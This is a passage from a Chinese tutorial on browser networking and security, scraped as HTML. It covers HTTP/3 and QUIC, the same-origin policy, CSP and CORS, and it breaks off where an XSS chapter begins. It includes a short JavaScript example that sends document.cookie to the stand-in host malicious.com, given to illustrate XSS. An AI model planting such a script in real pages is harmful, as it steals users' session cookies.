class="gatsby-resp-image-link" href="/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-16825.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 79.15966386554622%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAACqUlEQVQoz21T+0uTURjeH9UPWd6tkaZCUVFEkERB5pIyKRQxtIyuZmo6dZdvF50OlroLu6lDSc0rStqUdEO2vFsx7Xu/s53vdM43aNN8eTg85+V9znPec5ERKbBIIMqwL5CIBMr5KImJRIgxfoBIBFieR2waxUwlozIa/m0x3yAUdgp3+oT7DnTPhgqNglwnDAdxuQtla4SiXlRiF2j+So+QpYHWySgTi5I4+FN84ERlTlQ9hJ4OoRofKnMhhR3N/MCN41QD1YPw3Ad1PqjwQLGVtyxEk51xYSfkG+GCCYptwuUeKDDCOT1Q51IPOakneWai8JAbVpJjIil60jKFjzpTPHSiCi8qdzOusAsTYaLrdb3+2NagMTXpzB8483uVoa5ZpRvdSDh/28a5BsiTQA0pp7s4w/HeAFnsrZtrLJjnSvzGUr++2N9xfa4h3zrqT4gXtnCmFrK0QMc0NWRqIIeDUx28e5U4+kyGjvpudf2rNv0n7Rs3V2tW1nSNhRLixS1Mq7M5kOvgqhnyjEycpuI9ATLS125XPnFrqpWqthGuckarGFSWmMeC/4m1INfDTYtwXhKnq3nXKlnuf7GsKfrO3bK0135VXgsabs83X7R8XjokprY5XFzDVjmrg1QVPxAQrePLrbYptXP6rX2p1T6rds409U87FiJJPW/iDA1rlYJ1Lo0p7TAUwGVekqojud3krkMsshF5F5u2TCZdVei3WDWIjoDemXUp9m5UeOyGqgF4OSw880GlFx45eas/6ZGs7DFnes7pSUhVwaVudoQ0n6GG0ypG6I5OKPnmifjzlD7GARInQjiBMBu/hPDsOp4MH0pSjK3htV9MJyPHhyghmRwTsn+19PfFgWJ4Z3ePIry+sb2zS7G+sbkSCO7/4WlZFIu0Jt7sX+BC+Km1nY7YAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 17 25" title="" data-src="/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-fee1c.png" data-srcset="/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-a67b7.png 200w,\n/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-0b187.png 400w,\n/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-fee1c.png 800w,\n/static/2021-07-15-14-17-25-57ca15205026bf4c490c92add4fd0617-16825.png 1190w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>通过上图我们可以看出，HTTP/3 中的 QUIC 协议集合了以下几点功能。</p>\n<ul>\n<li>实现了类似 TCP 的流量控制、传输可靠性的功能。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</li>\n<li>集成了 TLS 加密功能。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</li>\n<li>实现了 HTTP/2 中的多路复用功能。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。</li>\n</ul>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-3c5e9.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 32.30337078651686%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsSAAALEgHS3X78AAABWElEQVQY01WR207CQBCG+1y+gzHxRXwEn8ErjZqYqDEmni6IwSuPGDwQAY2AglhAqQqUQqHQdnc/tyAaJ/mzc/gzO/OPoZRADG2UDACpETIxKQWoSayQ4q+GjHwxyivty1EPgSEDFye/RtCtUqg3uSvX8KrHuE8bSOcVp1Vn6TbLUSYPnoVbPqRf3GbQfiNvvvBhOwQ9i9bjMtJvY0Sfpc0yX/YXczGTmfUi1eIx54kVOo0K8/E005v7zG7tcpErUniMc3O9jt2oMbV4z0KizsDrktaDRGaEetWTtz1cPfJN+ZPTXI2KdcmVuYPbMNlJ5di8zrJ6m+T04ZmSdUaqcsCgWSWWKZF7t/F8h6QVZyg8DKUUgRxGSuj+Q42+ls0bAU0Af6yjivTVOk9qETQ3ygl9B8f/1G84XvlXZ91TqL84FJJe38Pt9Wg7HZotmyAIf0405krFP/sGzke++us3YsQAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 18 11" title="" data-src="/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-fee1c.png" data-srcset="/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-a67b7.png 200w,\n/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-0b187.png 400w,\n/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-fee1c.png 800w,\n/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-b1a91.png 1200w,\n/static/2021-07-15-14-18-11-bc430106e948163be203fe88f2467427-3c5e9.png 1424w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>实现了快速握手功能。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p>\n<h2 id="http3-的挑战"><a href="#http3-%E7%9A%84%E6%8C%91%E6%88%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/3 的挑战</h2>\n<p>通过上面的分析，我们相信在技术层面，HTTP/3 是个完美的协议。不过要将 HTTP/3 应用到实际环境中依然面临着诸多严峻的挑战，这些挑战主要来自于以下三个方面。</p>\n<ol>\n<li>从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。Chrome 虽然在数年前就开始支持 Google 版本的 QUIC，但是这个版本的 QUIC 和官方的 QUIC 存在着非常大的差异。</li>\n<li>部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</li>\n<li>中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～ 7% 的丢包率。</li>\n</ol>\n<h2 id="总结-2"><a href="#%E6%80%BB%E7%BB%93-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们首先分析了 HTTP/2 中所存在的一些问题，主要包括了 TCP 的队头阻塞、建立 TCP 连接的延时、TCP 协议僵化等问题。</p>\n<p>这些问题都是 TCP 的内部问题，因此要解决这些问题就要优化 TCP 或者“另起炉灶”创造新的协议。由于优化 TCP 协议存在着诸多挑战，所以官方选择了创建新的 QUIC 协议。</p>\n<p>HTTP/3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了“TCP+HTTP/2 的多路复用 +TLS 等功能”的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP/2 还更加高效的网络。</p>\n<p>虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。</p>\n<p>关于 HTTP/3 的未来，我有下面两点判断：</p>\n<ul>\n<li>从标准制定到实践再到协议优化还需要走很长一段路；</li>\n<li>因为动了底层协议，所以 HTTP/3 的增长会比较缓慢，这和 HTTP/2 有着本质的区别</li>\n</ul>\n<h1 id="同源策略：为什么-xmlhttprequst-不能跨域请求资源"><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-xmlhttprequst-%E4%B8%8D%E8%83%BD%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>同源策略：为什么 XMLHttpRequst 不能跨域请求资源</h1>\n<p>通过前面的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以我们就来系统地介绍下浏览器安全相关的内容。</p>\n<p>浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p>\n<p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界会是什么样子的呢？</p>\n<p>Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。</p>\n<p>Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p>\n<p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p>\n<ul>\n<li>修改银行站点的 DOM、CSSOM 等信息；</li>\n<li>在银行站点内部插入 JavaScript 脚本；</li>\n<li>劫持用户登录的用户名和密码；</li>\n<li>读取银行站点的 Cookie、IndexDB 等数据；</li>\n<li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li>\n</ul>\n<p>所以说，在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全。</p>\n<p>这就引出了页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。</p>\n<h2 id="什么是同源策略"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是同源策略</h2>\n<p>要了解什么是同源策略，我们得先来看看什么是同源。</p>\n<p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="33219815703457710000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0`, `33219815703457710000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p>\n<p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p>\n<ol>\n<li>DOM 层面。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</li>\n<li>数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。</li>\n<li>网络层面。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</li>\n</ol>\n<h2 id="安全和便利性的权衡"><a href="#%E5%AE%89%E5%85%A8%E5%92%8C%E4%BE%BF%E5%88%A9%E6%80%A7%E7%9A%84%E6%9D%83%E8%A1%A1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全和便利性的权衡</h2>\n<p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p>\n<h3 id="页面中可以嵌入第三方资源"><a href="#%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%B5%8C%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面中可以嵌入第三方资源</h3>\n<p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p>\n<p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p>\n<p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-bc0e5.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 43.66998577524893%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsSAAALEgHS3X78AAABgklEQVQoz21Q207bQBD1Txbx0AdacUcqb/2H/kBTiZsqRYRUPPADfcRJlGAJWwQJECaY9W7c2Nm1nfVl411m64BQ6ehodebsnJmdNZRSIs/zJCk4l7NUlZn6f0glpT7fwAA5HpPQdfnIZU8BHosoVkGkIqYmVKFAkVCFVErt/DcMUCspZwEJ+t3pvRs+4NBF5BYDMOAG+zd4fIeZhxNEACkmnPgce5wgo+5Zsukfqzexeok9SIbW2HJQ33ns2fcd2+87/sAZmbbXc7wucDu6HIQXHSg26veUWRYhVHC9MKJVw8z3u9n38+zbb9441+SHme2BYmrSMAuPapfeWRRFGkVZms7nFaRDIlaadLvNNk/Y2jH73GTA11tsqx2vHmvlU5M6qFyYS845pdV8Xv/JNRHLRxTqvpzG2+0YPEC+niUbLbZ7CilbOpxeYbEwv0b11z3EYumQfjigH3/CzHjnV7ze0i3AttJkoMOt478z15OTXPZHooblLXABeBSDFz3Ode0z8JPaZjd73tYAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 22 39" title="" data-src="/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-fee1c.png" data-srcset="/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-a67b7.png 200w,\n/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-0b187.png 400w,\n/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-fee1c.png 800w,\n/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-b1a91.png 1200w,\n/static/2021-07-15-14-22-39-183759d3f7f47ce53dfebb6e781e3fde-bc0e5.png 1406w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的链接指向。</p>\n<p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LocalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="59929567190579810000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`function onClick() {\n  let url = \\`http://malicious.com?cookie = \\${document.cookie}\\`;\n  open(url);\n}\nonClick();`, `59929567190579810000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://malicious.com?cookie = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>\n  <span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n<span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p>\n<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</p>\n<h3 id="跨域资源共享和跨文档消息机制"><a href="#%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E5%92%8C%E8%B7%A8%E6%96%87%E6%A1%A3%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>跨域资源共享和跨文档消息机制</h3>\n<p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p>\n<p>为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>\n<p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p>\n<h2 id="总结-3"><a href="#%E6%80%BB%E7%BB%93-3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p>\n<ul>\n<li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。</li>\n<li>使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li>\n<li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信</li>\n</ul>\n<h1 id="跨站脚本攻击-xss：为什么-cookie-中有-httponly-属性"><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-cookie-%E4%B8%AD%E6%9C%89-httponly-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>跨站脚本攻击 XSS：为什么 cookie 中有 httpOnly 属性</h1>\n<p>通过上篇文章的介绍，我们知道了同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。</p>\n<p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。</p>\n<h2 id="什么是-xss-攻击"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-xss-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是 